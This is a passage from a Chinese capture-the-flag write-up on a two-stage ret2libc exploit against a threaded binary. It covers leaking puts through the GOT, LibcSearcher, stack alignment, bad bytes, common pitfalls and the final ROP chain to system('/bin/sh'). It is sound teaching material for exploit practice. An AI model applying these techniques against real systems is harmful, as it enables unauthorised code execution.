ret2libc 通常不是一次溢出能完成的：**第一段负责泄露，第二段负责打**。中间需要一个“回到能再次读输入的地方”的地址。

这题的条件非常好：

- `main` 是 `while(1)`，天然支持再来一轮；
- 每次循环都会创建新线程读输入，等于一个“重新开始”的按钮；
- 回到 `main` 时它的序言会重建栈帧，垃圾 `rbp` 不影响。

如果题目没有循环、`main` 直接退出，就得换别的“再读一次”的入口，比如回到某个调用 `read` 的函数，或者用 `one_gadget` 一把梭。

### 6. LibcSearcher 的原理和局限

`LibcSearcher` 的匹配依据是**地址的低位**：同一版本的 libc，函数的页内偏移（低 12 位）是固定的。它拿泄露地址的低位去数据库里筛，筛出所有“可能是”的版本。

局限：

- 只泄露一个函数时，候选可能很多，不一定唯一；
- 数据库不是最新，冷门版本可能查不到；
- 选错版本 → 偏移错 → 利用失败。

更现代的替代方案：

| 方式 | 特点 |
| --- | --- |
| 题目给 libc | 最准，直接 `ELF()` 读符号 |
| `LibcSearcher` | 离线、脚本化，候选要手动选 |
| libc.rip / libc-database | 在线按符号+地址查，数据更新 |
| `pwninit` / `patchelf` | 本地把二进制和 libc、ld 配好，方便调试 |

### 7. 栈对齐规则复习

> **通过 ROP 进入 libc 函数时，如果进入那一刻 `rsp % 16 == 0`，就在链子最前面加一个 `ret`。**

为什么加在最前面？因为 `ret` 消耗 8 字节，会把后面所有栈槽整体后移 8，从而改变进入目标函数时的对齐状态。

验证方法：

- gdb 在目标函数入口下断点，`p $rsp & 0xf`；
- 或者跑起来看是不是崩在 `movaps` 附近；
- 加一个 `ret` 再试。

### 8. 地址里出现 `\x0a` 或 `\x7f` 的边界情况

这题有两个“看运气”的地方，值得单独记一下：

| 字节 | 出现在哪里 | 后果 | 处理 |
| --- | --- | --- | --- |
| `0x0a` | payload 任意位置 | 循环提前 `break`，链被截断 | 换泄露函数 / 换地址 / 调整链 |
| `0x7f` | 泄露地址的低 5 字节 | `recvuntil` 提前停，地址截断 | 改用 `recvline` + `recvn(6)` |

这两个都属于“大多数时候没问题，偶尔翻车”的情况。写 exp 时如果地址都算对了却打不通，先看看发出去的 payload 里有没有 `0x0a`。

## 几个容易踩的坑

| # | 坑 | 现象 | 正确做法 |
| --- | --- | --- | --- |
| 1 | 偏移写 `0x28`（只算 `s`） | 链子从 `v3`/`i` 开始，返回地址没覆盖到 | `0x30` 到 saved rbp，`0x38` 到返回地址 |
| 2 | `0x2c ~ 0x2f` 填 `'a'` | `i` 变成 `0x61616161`，`read` 写到非法地址 | 写 `p32(0x2c)` 把 `i` 补回去 |
| 3 | 写成 `p32(0x30)` 或 4 个 `\x00` | `i` 跑偏，payload 整体错位 | 必须是 `2c 00 00 00` |
| 4 | 忘记发换行 | 循环一直等输入，程序不返回 | `sendline`，末尾的 `\n` 是结束条件 |
| 5 | payload 里含 `0x0a` | 循环提前结束，链被截断 | 检查地址字节，必要时换函数/换链 |
| 6 | `recvuntil(b'\x7f')` 被提前截断 | 算出来的基址不对，第二段崩 | 用 `recvline()` + `recvn(6)` |
| 7 | 泄露 `puts@plt` 而不是 `puts@got` | 打印的是跳板代码，不是 libc 地址 | 参数用 `elf.got['puts']` |
| 8 | 第一段没回 `main` | 进程结束，没有第二次输入 | 链尾放 `p64(main)` |
| 9 | LibcSearcher 选了 32 位 libc | `system` 地址错，段错误 | 看 ELF Class，选 `amd64` 的真 64 位库 |
| 10 | 第二段没加 `ret` | 崩在 `system` 的 `movaps` | 链首加一个普通 `ret` |
| 11 | `p32` / `p64` 混用 | 地址被截断或补齐错误 | 4 字节变量用 `p32`，地址用 `p64` |

## 完整流程速查

| 步骤 | 目的 | 操作 | 结果 |
| --- | --- | --- | --- |
| 1 | 看结构 | IDA 看 `main` | `while(1)` 创建并 join 线程 |
| 2 | 找溢出 | IDA 看 `test_thread` | `s[40]`，逐字节读到 `i == 4095` |
| 3 | 数偏移 | 画栈图 | `0x30` 到 saved rbp，`0x2c` 是 `i` |
| 4 | 处理 `i` | 写 `p32(0x2c)` | 循环变量原地不动 |
| 5 | 找 gadget | ROPgadget | `pop rdi; ret = 0x401313`，`ret = 0x40101a` |
| 6 | 第一段 | `pop rdi; puts_got; puts_plt; main` | 打印 `puts` 真实地址 |
| 7 | 算 libc | `LibcSearcher('puts', addr)` | 基址、`system`、`/bin/sh` |
| 8 | 选版本 | 从候选里挑 64 位 libc | 本例选 `libc6_2.27-3ubuntu1.3_amd64` |
| 9 | 第二段 | `ret; pop rdi; bin_sh; system` | `system("/bin/sh")` |
| 10 | 拿 flag | `cd /home/ctf`，`cat flag.txt` | flag 到手 |

## 小结

这道题把几个容易混的点串在了一起：

- **线程栈也是栈**：溢出、ROP 的套路不变，多出来的只是 `main` 的循环给了第二次机会；
- **逐字节 `read`**：二进制安全，但遇 `\n` 就停，payload 里不能有 `0x0a`，末尾必须发换行；
- **循环变量是地雷**：`i` 在 `rbp-0x4`，写到它的时候必须用 `p32(0x2c)` 把它“写回去”；
- **没有 libc 也能 ret2libc**：泄露一个已知函数 → 反查版本 → 算基址 → 算 `system` 和 `/bin/sh`；
- **两段式利用**：第一段泄露并回到 `main`，第二段才真正拿 shell；
- **栈对齐**：第二段加一个 `ret`，让 `system` 入口的 `rsp % 16 == 8`。

真正容易卡住的，往往不是“怎么找 gadget”，而是中间那两个细节：**`0x2c` 那个循环变量**，以及**泄露和二次利用的衔接**。地址全对、链子也顺，就是打不通的时候，先回去看看 `i` 有没有被写坏、`0x0a` 有没有混进去、libc 有没有选错。

最后留三个问题，你可以自己想一想：

1. 如果这题不给你第二次输入机会（`main` 没有 `while(1)`），你会怎么只用一个 payload 同时完成泄露和调用 `system`？
2. 如果把 `i` 的类型从 `int` 换成 `short`，偏移和 `p32(0x2c)` 的写法要怎么改？
3. 如果泄露的地址低字节里正好有 `0x7f`，`recvuntil(b'\x7f')` 会怎么错？你能写出更稳的接收方式吗？

下一步可以练：带 Canary 的版本（先泄露 Canary 再溢出）、给了 libc 的 ret2libc（不用 LibcSearcher）、以及把 `read` 的逐字节循环换成 `gets` / `scanf` 之后再体会一次 `\x00` 和 `\n` 的差别。
